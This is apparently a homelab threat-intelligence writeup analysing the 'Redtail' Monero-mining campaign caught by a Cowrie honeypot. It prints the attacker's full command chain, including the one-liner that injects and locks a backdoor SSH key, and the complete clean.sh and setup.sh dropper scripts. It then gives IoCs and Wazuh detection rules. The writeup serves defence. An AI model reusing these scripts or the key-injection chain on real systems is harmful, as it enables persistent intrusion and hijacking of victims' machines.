# "Redtail" — SFTP-Delivered Multi-Arch Cryptominer with SSH Backdoor Persistence

**Document ID:** NINGI-WRITEUP-009  
**Date:** 2026-05-04  
**Category:** Malware Analysis / Threat Intelligence  
**Environment:** fuji-mailbox VPS — Cowrie 2.x / Wazuh 4.14.0  
**Severity:** High  

---

## Overview

This writeup documents a campaign I captured with the Cowrie SSH honeypot on 2026-05-04, with artefacts tracing back to at least 2026-04-02. The campaign deploys multi-architecture ELF binaries named `redtail.*` via SFTP upload (not wget/curl), injects a persistent SSH backdoor key (`rsa-key-20230629`), and uses a hex-encoded C2 beacon to confirm successful compromise. A staging script pair (`clean.sh` + `setup.sh`) handles environment preparation and is deleted after execution.

This campaign is distinct from the Mirai `mdrfckr` key injection campaign documented in NINGI-WRITEUP-004. While both inject SSH backdoor keys, the delivery method, tooling, key material, and persistence technique differ meaningfully. The binary name `redtail` is a self-identifier consistent with the "Redtail" cryptomining botnet documented externally since mid-2024.

All artefacts in this writeup were captured by Cowrie on fuji, including the full source of both staging scripts. The `clean.sh` script confirms the campaign mines **Monero (XMR) via c3pool** and cleans competing malware from crontabs before deploying. The `setup.sh` script performs architecture detection, finds a writable executable directory, renames the binary to a hidden random filename, and launches with an `ssh` spreading argument. Both scripts erase themselves after execution.

---

## Dataset Context

| Metric | Value |
|---|---|
| Primary session | `6417de464d95` — 2026-05-04T17:15:11Z |
| Probe session | `82d04432284f` — 2026-05-04T17:15:09Z |
| Earliest artefact timestamp | 2026-04-02T18:41Z (same SHA-256 hashes) |
| Session duration | 66.9 seconds |
| Commands executed | 1 (compound chain) |
| SFTP uploads captured | 6 files |
| File downloads captured | 1 (authorized_keys payload) |

---

## Attack Chain

```
17:14:03 — 172.245.16.13 begins credential spray
            Attempts: admin/admin (fail), orangepi/orangepi (fail)

17:15:09 — 172.245.16.13: root/P succeeds
            Session 82d04432284f
            Duration: 1.3 seconds — no commands
            Role: PROBE — confirms target accepts root/P, signals delivery node

17:15:11 — 130.12.180.51: root/P succeeds (2 seconds after probe)
            Session 6417de464d95
            SSH-2.0-Go client, HASSH: 5f904648ee8964bef0e8834012e26003

17:16:17 — SFTP uploads complete (6 files pushed to honeypot filesystem)
            clean.sh, setup.sh, redtail.arm7, redtail.arm8, redtail.i686, redtail.x86_64

17:16:17 — Single compound command executed:
            chmod +x clean.sh; sh clean.sh; rm -rf clean.sh;
            chmod +x setup.sh; sh setup.sh; rm -rf setup.sh;
            mkdir -p ~/.ssh; chattr -ia ~/.ssh/authorized_keys;
            echo "ssh-rsa AAAA...rsa-key-20230629" > ~/.ssh/authorized_keys;
            chattr +ai ~/.ssh/authorized_keys;
            uname -a;
            echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"

17:16:18 — Session closed
```

**The probe and payload nodes are two separate IPs firing 2 seconds apart.** `172.245.16.13` confirms the credential works, then immediately hands off to `130.12.180.51` which performs the full delivery. This two-node coordination is deliberate infrastructure separation — the scanner and the payload delivery node are distinct.

---

## Attacker Infrastructure

| Attribute | Probe node | Delivery node |
|---|---|---|
| IP | `172.245.16.13` | `130.12.180.51` |
| Session ID | `82d04432284f` | `6417de464d95` |
| SSH client | — | `SSH-2.0-Go` |
| HASSH | — | `5f904648ee8964bef0e8834012e26003` |
| Credential | `root/P` | `root/P` |
| Session duration | 1.3s | 66.9s |
| Actions | Probe only | Full payload delivery |

**Credential of note: `root/P`** — a single-character password. This is not a default credential for any common distribution. It targets administrators who set a minimal password on a fresh install, or systems configured with deliberately weak credentials for lab/test use. The credential appears coordinated between both nodes, meaning the scanner had it pre-loaded.

---

## Delivery Method — SFTP Upload

Unlike most campaigns that fetch payloads via `wget` or `curl` from attacker-controlled HTTP infrastructure, Redtail **pushes binaries directly to the target via SFTP** before executing any shell commands. This is a significant operational difference:

- No outbound HTTP request from the target — evades egress filtering and proxy logs
- No external URL to burn — the C2 server hosting files is never exposed in logs
- Binaries are pre-staged in the session before the command runs, so execution is immediate

The upload order (reconstructed from Cowrie `cowrie.session.file_upload` events at session close):

| Filename | SHA-256 | Size |
|---|---|---|
| `clean.sh` | `d46555af1173d22f07c37ef9c1e0e74fd68db022f2b6fb3ab5388d2c5bc6a98e` | 795 B |
| `redtail.arm7` | `3625d068896953595e75df328676a08bc071977ac1ff95d44b745bbcb7018c6f` | 1,299,516 B (1.2 MB) |
| `redtail.arm8` | `dbb7ebb960dc0d5a480f97ddde3a227a2d83fcaca7d37ae672e6a0a6785631e9` | 1,560,860 B (1.5 MB) |
| `redtail.i686` | `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | 1,748,196 B (1.7 MB) |
| `redtail.x86_64` | `59c29436755b0778e968d49feeae20ed65f5fa5e35f9f7965b8ed93420db91e5` | 1,880,264 B (1.8 MB) |
| `setup.sh` | `783adb7ad6b16fe9818f3e6d48b937c3ca1994ef24e50865282eeedeab7e0d59` | 1,951 B |

**Four architectures covered:** ARM 32-bit (arm7), ARM 64-bit (arm8), x86 32-bit (i686), x86 64-bit (x86_64). The size progression (1.2 → 1.5 → 1.7 → 1.8 MB) is consistent with static or near-static ELF binaries — likely XMRig or a similar miner compiled with bundled libcrypto. These are not the tiny (67–196 KB) Mirai-style scanner binaries; the size points firmly at a miner or multi-function bot.

**Persistence of tooling:** The identical SHA-256 hashes for all six files first appear in Cowrie's downloads directory on **2026-04-02T18:41Z** — 32 days before this session. The same binaries were used on April 2 and May 4 without modification, indicating the operator has not rotated tooling in at least a month.

---

## Command Chain Analysis

The entire attack is a single compound shell command:

```bash
chmod +x clean.sh; sh clean.sh; rm -rf clean.sh;
chmod +x setup.sh; sh setup.sh; rm -rf setup.sh;
mkdir -p ~/.ssh;
chattr -ia ~/.ssh/authorized_keys;
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCqHrvnL6l7rT/mt1AdgdY9tC1GPK216q0q/
7neNVqm7AgvfJIM3ZKniGC3S5x6KOEApk+83GM4IKjCPfq007SvT07qh9AscVxegv66I5yuZTEaDAG6cPXxg3/
0oXHTOTvxelgbRrMzfU5SEDAEi8+ByKMefE+pDVALgSTBYhol96hu1GthAMtPAFahqxrvaRR4nL4ijxOsmSLRE
oAb1lxiX7yvoYLT45/1c5dJdrJrQ60uKyieQ6FieWpO2xF6tzfdmHbiVdSmdw0BiCRwe+fuknZYQxIC1owAj2p5
bc+nzVTi3mtBEk9rGpgBnJ1hcEUslEf/zevIcX8+6H7kUMRr rsa-key-20230629" > ~/.ssh/authorized_keys;
chattr +ai ~/.ssh/authorized_keys;
uname -a;
echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"
```

**Step 1 — Run and erase `clean.sh`:**  
`clean.sh` (795 B) runs first. See full analysis below. Deleted immediately after execution.

**Step 2 — Run and erase `setup.sh`:**  
`setup.sh` (1,951 B) handles architecture detection and binary deployment. See full analysis below. Deleted immediately after execution.

**Step 3 — Create `.ssh` directory:**  
`mkdir -p ~/.ssh` ensures the SSH config directory exists, with `-p` suppressing errors if it already exists.

**Step 4 — Remove immutable attributes:**  
`chattr -ia ~/.ssh/authorized_keys` strips any existing immutable (`i`) and append-only (`a`) flags. This mirrors the mdrfckr campaign step — the attacker anticipates hardened systems and clears the way.

**Step 5 — Inject backdoor key (overwrite, not append):**  
```
echo "ssh-rsa ... rsa-key-20230629" > ~/.ssh/authorized_keys
```
Note `>` (overwrite) rather than `>>` (append). This replaces the entire `authorized_keys` file with only the attacker's key, locking out all legitimate administrators. The mdrfckr campaign uses `rm -rf .ssh && mkdir .ssh` then `>>`; Redtail skips the directory recreation and uses a direct overwrite.

**Step 6 — Lock the file immutable:**  
`chattr +ai ~/.ssh/authorized_keys` — sets **both** the immutable (`i`) and append-only (`a`) flags. Immutable prevents modification or deletion even by root. Append-only prevents existing content from being overwritten. Together this is stronger persistence than any single flag and requires explicit `chattr -ia` to undo — an attacker-aware hardening step.

This is the **inverse** of Step 4. The campaign removes existing immutability (to write), writes the key, then re-applies immutability (to protect). The mdrfckr campaign only removes the flag without re-adding it.

**Step 7 — System fingerprint:**  
`uname -a` — collects kernel version, architecture, and hostname. Output is sent back over the SSH channel to the operator.

**Step 8 — C2 beacon:**  
```bash
echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"
```
Decoded: `auth_ok\n`. This is a confirmation signal sent back over the session channel — the C2 infrastructure (or a log-scraping process on the delivery node) reads this output to confirm the persistence step completed successfully. The beacon only fires after `chattr +ai` has run, so it specifically confirms persistence, not just login.

This is the clearest C2 signalling behaviour I have captured in Cowrie to date. The `mdrfckr` campaign has no equivalent.

---

## Captured Artifact — clean.sh

**SHA-256:** `d46555af1173d22f07c37ef9c1e0e74fd68db022f2b6fb3ab5388d2c5bc6a98e`  
**Size:** 795 bytes  
**Captured:** `cowrie.session.file_upload` via SFTP

```bash
#!/bin/bash

clean_crontab() {
  chattr -ia "$1"
  grep -vE 'wget|curl|/dev/tcp|/tmp|\.sh|nc|bash -i|sh -i|base64 -d' "$1" >/tmp/clean_crontab
  mv /tmp/clean_crontab "$1"
}

systemctl disable c3pool_miner
systemctl stop c3pool_miner

chattr -ia /var/spool/cron/crontabs
for user_cron in /var/spool/cron/crontabs/*; do
  [ -f "$user_cron" ] && clean_crontab "$user_cron"
done

for system_cron in /etc/crontab /etc/crontabs; do
  [ -f "$system_cron" ] && clean_crontab "$system_cron"
done

for dir in /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly /etc/cron.d; do
  chattr -ia "$dir"
  for system_cron in "$dir"/*; do
    [ -f "$system_cron" ] && clean_crontab "$system_cron"
  done
done

clean_crontab /etc/anacrontab

for i in /tmp /var/tmp /dev/shm; do
  rm -rf $i/*
done
```

**`systemctl disable c3pool_miner` / `systemctl stop c3pool_miner`** — This is the most significant line in the script. `c3pool` is a well-known Monero (XMR) mining pool. The presence of a systemd service named `c3pool_miner` is a Redtail campaign artefact — previous Redtail infections register the miner as a service for persistence. This `clean.sh` therefore kills and disables a **prior Redtail installation** on the same host before deploying fresh. The campaign reinstalls itself cleanly rather than stacking on top of a stale deployment.

**`clean_crontab()` — Competitor eviction via crontab scrubbing:**  
The function strips crontab entries containing: `wget`, `curl`, `/dev/tcp`, `/tmp`, `.sh`, `nc`, `bash -i`, `sh -i`, `base64 -d`. This covers essentially every common malware persistence pattern used in crontabs — wget/curl downloaders, TCP reverse shells, temp-directory scripts, netcat shells, and base64-encoded payloads. The script uses `chattr -ia` on each crontab file before modifying it, anticipating hardened targets.

The scope is exhaustive: user crontabs (`/var/spool/cron/crontabs/*`), system crontab (`/etc/crontab`, `/etc/crontabs`), all cron drop directories (`/etc/cron.{hourly,daily,weekly,monthly,d}`), and `anacrontab`. Any competing malware maintaining cron persistence is evicted before Redtail deploys.

**`/tmp`, `/var/tmp`, `/dev/shm` wipe:**  
`rm -rf $i/*` clears all three common staging directories. This removes competing malware payloads that were staged there, and clears evidence of the attacker's own prior activity on previously compromised hosts.

The ordering matters: the systemd service is killed *before* crontabs are cleaned. If a previous `c3pool_miner` service had a cron watchdog entry, killing the service first prevents it from respawning during the crontab cleanup pass.

---

## Captured Artifact — setup.sh

**SHA-256:** `783adb7ad6b16fe9818f3e6d48b937c3ca1994ef24e50865282eeedeab7e0d59`  
**Size:** 1,951 bytes  
**Captured:** `cowrie.session.file_upload` via SFTP

```bash
#!/bin/bash

get_random_string() {
  len=$(expr $(od -An -N2 -i /dev/urandom 2>/dev/null | tr -d ' ') % 32 + 4 2>/dev/null)

  if command -v openssl >/dev/null 2>&1; then
    str=$(openssl rand -base64 256 2>/dev/null | tr -dc 'A-Za-z0-9' | head -c "$len")
    if [ -n "$str" ]; then echo "$str"; return 0; fi
  fi

  if [ -r /dev/urandom ]; then
    str=$(tr -dc 'A-Za-z0-9' </dev/urandom 2>/dev/null | head -c "$len")
    if [ -n "$str" ]; then echo "$str"; return 0; fi
  fi

  if [ -n "$RANDOM" ]; then echo "$RANDOM"; return 0; fi

  echo "redtail"   # hardcoded fallback — campaign name embedded in script
  return 1
}

NOARCH=false
ARCH=$(uname -mp)

if echo "$ARCH" | grep -q "x86_64" || echo "$ARCH" | grep -q "amd64"; then
  ARCH="x86_64"
elif echo "$ARCH" | grep -q "i[3456]86"; then
  ARCH="i686"
elif echo "$ARCH" | grep -q "armv8" || echo "$ARCH" | grep -q "aarch64"; then
  ARCH="arm8"
elif echo "$ARCH" | grep -q "armv7"; then
  ARCH="arm7"
else
  NOARCH=true
fi

NOEXEC_DIRS=$(cat /proc/mounts | grep 'noexec' | awk '{print $2}')
EXCLUDE=""
for dir in $NOEXEC_DIRS; do
  EXCLUDE="${EXCLUDE} -not -path \"$dir\" -not -path \"$dir/*\""
done

FOLDERS=$(eval find / -type d -user $(whoami) -perm -u=rwx \
  -not -path "/tmp/*" -not -path "/proc/*" $EXCLUDE 2>/dev/null)
CURR=${PWD}
FILENAME=".$(get_random_string)"

for i in $FOLDERS /tmp /var/tmp /dev/shm; do
  if cd "$i" && touch .testfile && \
     (dd if=/dev/zero of=.testfile2 bs=2M count=1 >/dev/null 2>&1 || \
      truncate -s 2M .testfile2 >/dev/null 2>&1); then
    rm -rf .testfile .testfile2
    if [ "$CURR" != "$i" ]; then cp -r "$CURR"/redtail.* "$i"; fi
    break
  fi
done

rm -rf .redtail
rm -rf $FILENAME

if [ $NOARCH = true ]; then
  for a in x86_64 i686 arm8 arm7; do
    cat redtail.$a >$FILENAME
    chmod +x $FILENAME
    ./$FILENAME ssh
  done
else
  cat redtail.$ARCH >$FILENAME
  chmod +x $FILENAME
  ./$FILENAME ssh
fi

rm -rf redtail.*
rm -rf "$CURR"/redtail.*
```

**`get_random_string()` — Hidden filename generation:**  
Generates a random alphanumeric string using `openssl rand`, `/dev/urandom`, or shell `$RANDOM` as fallbacks. The length is randomised (4–35 chars). The resulting string is prefixed with `.` to create a hidden file: `.$(get_random_string)`. If all entropy sources fail, the fallback is the literal string `"redtail"` — the campaign name is hardcoded into the script. This means on a sufficiently locked-down system the binary would be named `.redtail`, which is itself a detection IoC.

**Architecture detection via `uname -mp`:**  
Maps the machine hardware and processor fields to one of four targets: `x86_64`, `i686`, `arm8` (armv8/aarch64), `arm7`. Sets `NOARCH=true` if no match — triggering the shotgun fallback path.

**Writable executable directory search:**  
Finds directories owned by the current user with rwx permissions, explicitly excluding `/tmp` and `/proc`, and filtering out `noexec` mount points (read from `/proc/mounts`). This is more careful than most malware — it avoids writing to directories where execution is blocked at the filesystem level, which would cause silent failures. `/tmp` is excluded from the search but added as a last-resort fallback.

The directory is tested for actual writability and sufficient space (attempts to write a 2 MB test file) before being selected. The 2 MB threshold is likely calibrated against the smallest `redtail.*` binary (arm7 at 1.2 MB).

**Binary deployment and hidden rename:**  
The correct-arch binary is copied via `cat redtail.$ARCH > $FILENAME` rather than `cp` or `mv`. This writes file content without preserving the original filename in any metadata. The resulting hidden file (`.Xk9mQr2...`) has no obvious connection to `redtail`.

**`$FILENAME ssh` — SSH spreading mode:**  
Every binary is invoked with `ssh` as the sole argument. Identical to the `tux.* ssh` pattern in the Mirai campaign (NINGI-WRITEUP-004), this argument instructs the binary to run in SSH propagation mode — scanning for and attacking other SSH-accessible hosts. The miner binary itself is the spreader.

**`NOARCH` fallback — shotgun deployment:**  
On unrecognised architectures, the script tries all four binaries sequentially. The OS rejects incompatible ELF formats with `Exec format error`; only the matching architecture executes. This mirrors the Mirai multi-arch dropper approach from NINGI-WRITEUP-004.

**Anti-forensics cleanup:**  
`rm -rf redtail.*` and `rm -rf "$CURR"/redtail.*` remove the binaries from both the deployment directory and the original working directory. Combined with the earlier deletion of `clean.sh` and `setup.sh` from the main command, there are no named artefacts left on disk — only the hidden random-named running process.

---

## Captured Artifact — SSH Public Key

**SHA-256:** `8a68d1c08ea31250063f70b1ccb5051db1f7ab6e17d46e9dd3cc292b9849878b`  
**Size:** 398 bytes  
**Captured:** `cowrie.session.file_download` (Cowrie intercepted the echo redirect)

```
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCqHrvnL6l7rT/mt1AdgdY9tC1GPK216q0q/7neNVqm7Agv
fJIM3ZKniGC3S5x6KOEApk+83GM4IKjCPfq007SvT07qh9AscVxegv66I5yuZTEaDAG6cPXxg3/0oXHTOTvxe
lgbRrMzfU5SEDAEi8+ByKMefE+pDVALgSTBYhol96hu1GthAMtPAFahqxrvaRR4nL4ijxOsmSLREoAb1lxiX7
yvoYLT45/1c5dJdrJrQ60uKyieQ6FieWpO2xF6tzfdmHbiVdSmdw0BiCRwe+fuknZYQxIC1owAj2p5bc+nzVTi
3mtBEk9rGpgBnJ1hcEUslEf/zevIcX8+6H7kUMRr rsa-key-20230629
```

The key comment `rsa-key-20230629` encodes a date: **June 29, 2023**. This matches external threat intelligence reports placing the Redtail campaign origin in mid-2023. The key has not changed in the intervening ~23 months, indicating either the operator has not rotated key material or the private key is baked into their infrastructure and impractical to replace.

Any system with this key in `authorized_keys` is owned by the Redtail operator and accessible to anyone holding the corresponding private key. Defenders can grep for it directly:

```bash
grep -r "rsa-key-20230629" /home/*/.ssh/ /root/.ssh/
grep -r "CqHrvnL6l7rT" /home/*/.ssh/ /root/.ssh/
```

---

## Comparison to mdrfckr Campaign (NINGI-WRITEUP-004)

Both campaigns inject SSH backdoor keys, but every implementation detail differs:

| Attribute | mdrfckr (NINGI-004) | Redtail (NINGI-009) |
|---|---|---|
| Key comment | `mdrfckr` | `rsa-key-20230629` |
| Key algo | RSA (BJQA prefix) | RSA (DAQA prefix — longer key) |
| Write mode | Append (`>>`) | Overwrite (`>`) |
| chattr before write | `-ia` (remove) | `-ia` (remove) |
| chattr after write | None | `+ai` (add both — stronger) |
| .ssh directory | Wiped and recreated | Created if missing only |
| Payload delivery | wget / curl from URL | SFTP upload (push) |
| Staging scripts | None | `clean.sh` + `setup.sh` |
| Self-deletion | No | Yes — both scripts erased |
| C2 beacon | None | `auth_ok\n` (hex-encoded) |
| Binary names | `tux.*` (Mirai) | `redtail.*` |
| Binary sizes | Small (IoT scanner) | 1.2–1.8 MB (miner/bot) |
| Two-node infra | No | Yes (probe + delivery) |

These are distinct operations. Redtail is more operationally sophisticated: push-based delivery avoids URL exposure, staging scripts abstract the deployment logic, the double-chattr sequence is a deliberate hardening inversion, and the `auth_ok` beacon provides delivery confirmation to the operator.

---

## Indicators of Compromise

| Type | Value | Notes |
|---|---|---|
| IP | `130.12.180.51` | Payload delivery node |
| IP | `172.245.16.13` | Scanner / probe node |
| HASSH | `5f904648ee8964bef0e8834012e26003` | Go-based SSH scanner |
| SSH key comment | `rsa-key-20230629` | Backdoor key identifier |
| SHA-256 | `8a68d1c08ea31250063f70b1ccb5051db1f7ab6e17d46e9dd3cc292b9849878b` | authorized_keys payload (398 B) |
| SHA-256 | `d46555af1173d22f07c37ef9c1e0e74fd68db022f2b6fb3ab5388d2c5bc6a98e` | `clean.sh` (795 B) |
| SHA-256 | `783adb7ad6b16fe9818f3e6d48b937c3ca1994ef24e50865282eeedeab7e0d59` | `setup.sh` (1,951 B) |
| SHA-256 | `3625d068896953595e75df328676a08bc071977ac1ff95d44b745bbcb7018c6f` | `redtail.arm7` (1.2 MB) |
| SHA-256 | `dbb7ebb960dc0d5a480f97ddde3a227a2d83fcaca7d37ae672e6a0a6785631e9` | `redtail.arm8` (1.5 MB) |
| SHA-256 | `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | `redtail.i686` (1.7 MB) |
| SHA-256 | `59c29436755b0778e968d49feeae20ed65f5fa5e35f9f7965b8ed93420db91e5` | `redtail.x86_64` (1.8 MB) |
| Beacon string | `auth_ok` | Hex-encoded in command: `\x61\x75\x74\x68\x5F\x6F\x6B\x0A` |
| Filename pattern | `redtail.(arm7\|arm8\|i686\|x86_64)` | Binary naming convention |
| Credential | `root/P` | Single-character password targeting |

---

## Detection Rules

```xml
<!-- Redtail: rsa-key-20230629 SSH backdoor key -->
<rule id="100120" level="15">
  <if_sid>100100</if_sid>
  <field name="eventid">cowrie.command.input</field>
  <match>rsa-key-20230629\|CqHrvnL6l7rT</match>
  <description>Cowrie: Redtail SSH backdoor key injection detected</description>
  <group>cowrie,persistence,redtail,ioc,</group>
</rule>

<!-- Redtail: chattr +ai after authorized_keys write (persistence lock) -->
<rule id="100121" level="14">
  <if_sid>100100</if_sid>
  <field name="eventid">cowrie.command.input</field>
  <match>chattr \+ai.*authorized_keys</match>
  <description>Cowrie: authorized_keys locked immutable — Redtail-style persistence</description>
  <group>cowrie,persistence,defense_evasion,redtail,</group>
</rule>

<!-- Redtail: hex-encoded auth_ok C2 beacon -->
<rule id="100122" level="13">
  <if_sid>100100</if_sid>
  <field name="eventid">cowrie.command.input</field>
  <match>\\x61\\x75\\x74\\x68\\x5F\\x6F\\x6B\|auth_ok</match>
  <description>Cowrie: C2 beacon 'auth_ok' detected — Redtail compromise confirmation</description>
  <group>cowrie,c2,redtail,</group>
</rule>

<!-- Redtail: SFTP upload of redtail.* binaries -->
<rule id="100123" level="14">
  <if_sid>100100</if_sid>
  <field name="eventid">cowrie.session.file_upload</field>
  <match>redtail\.</match>
  <description>Cowrie: Redtail multi-arch binary uploaded via SFTP</description>
  <group>cowrie,malware,redtail,</group>
</rule>

<!-- Redtail: staging script pair pattern -->
<rule id="100124" level="13">
  <if_sid>100100</if_sid>
  <field name="eventid">cowrie.command.input</field>
  <match>sh clean\.sh.*rm -rf clean\.sh.*sh setup\.sh.*rm -rf setup\.sh</match>
  <description>Cowrie: Redtail staging script deploy-and-erase pattern detected</description>
  <group>cowrie,defense_evasion,redtail,</group>
</rule>
```

---

## MITRE ATT&CK Mapping

| Technique | ID | Observed |
|---|---|---|
| Valid Accounts: Default Accounts | T1078.001 | `root/P` credential |
| Remote Services: SSH | T1021.004 | SFTP used for binary delivery |
| Ingress Tool Transfer | T1105 | Six files pushed via SFTP |
| Command and Scripting Interpreter: Unix Shell | T1059.004 | Compound shell command execution |
| Indicator Removal: File Deletion | T1070.004 | `rm -rf clean.sh`, `rm -rf setup.sh` |
| Account Manipulation: SSH Authorized Keys | T1098.004 | `rsa-key-20230629` key injection |
| File and Directory Permissions Modification | T1222.002 | `chattr -ia` then `chattr +ai` |
| System Information Discovery | T1082 | `uname -a` |
| Resource Hijacking | T1496 | Monero mining via c3pool confirmed by `clean.sh` |
| Service Stop | T1489 | `systemctl stop c3pool_miner` — kills prior installation |
| Masquerading: Match Legitimate Name or Location | T1036.005 | Binary renamed to hidden dot-file with random name |
| Application Layer Protocol | T1071 | `auth_ok` beacon over SSH channel |

---

## Lessons Learned

**SFTP upload evades URL-based detection.** Every detection rule and SIEM alert built around `wget`/`curl` URLs misses push-based delivery entirely. The only log evidence is `cowrie.session.file_upload` events and the binary filenames — there is no C2 URL to pivot on.

**The `chattr +ai` pattern is a reliable Redtail IoC.** The sequence `chattr -ia` → write key → `chattr +ai` is operationally specific. Defenders can scan for it with: `lsattr /root/.ssh/authorized_keys` — the `ia` flags on an authorized_keys file indicate this campaign specifically.

**`auth_ok` beacon is a detection opportunity.** The hex encoding `\x61\x75\x74\x68\x5F\x6F\x6B\x0A` is detectable in command logs before decoding. Any session ending with this sequence after an authorized_keys write should be treated as a confirmed Redtail deployment.

**Tooling has not rotated in 32+ days.** The identical SHA-256 hashes from April 2 to May 4 mean existing hash-based detections remain valid. If the operator updates binaries, expect a new set of hashes while other TTPs stay constant.

**Two-node infrastructure separates scanning risk from delivery risk.** The probe IP (`172.245.16.13`) is the one that appears in repeated scan logs and is likely to get blocked first. The delivery IP (`130.12.180.51`) only appears once the credential is confirmed, reducing its exposure to blocklists. Defenders should correlate probe-then-deliver patterns across sessions, not just flag individual IPs.

**`clean.sh` kills its own previous installation first.** The `systemctl stop c3pool_miner` call targets a service that Redtail itself creates — meaning the campaign reinstalls cleanly over stale deployments rather than stacking. On a real compromised host, `systemctl status c3pool_miner` before and after an attack would show the service being stopped and then re-registered under a random hidden name.

**`setup.sh` avoids `noexec` mounts.** The script reads `/proc/mounts` and explicitly excludes directories mounted with the `noexec` flag. Most malware just writes to `/tmp` and fails silently on hardened systems. Redtail tests for writability and executability before committing — a reliability improvement that increases successful deployments on locked-down targets.

**The `.redtail` fallback is an IoC.** If `openssl` and `/dev/urandom` are both unavailable, the hidden binary is literally named `.redtail`. Checking for this file across user home directories and common writable paths is a fast triage step: `find / -name ".redtail" 2>/dev/null`.

---

*All artefacts documented here were captured by Cowrie on fuji between 2026-04-02 and 2026-05-04.*  
*`clean.sh`, `setup.sh`, and the authorized_keys payload were read directly from the Cowrie downloads directory.*  
*This writeup is part of the ningi homelab security research project.*
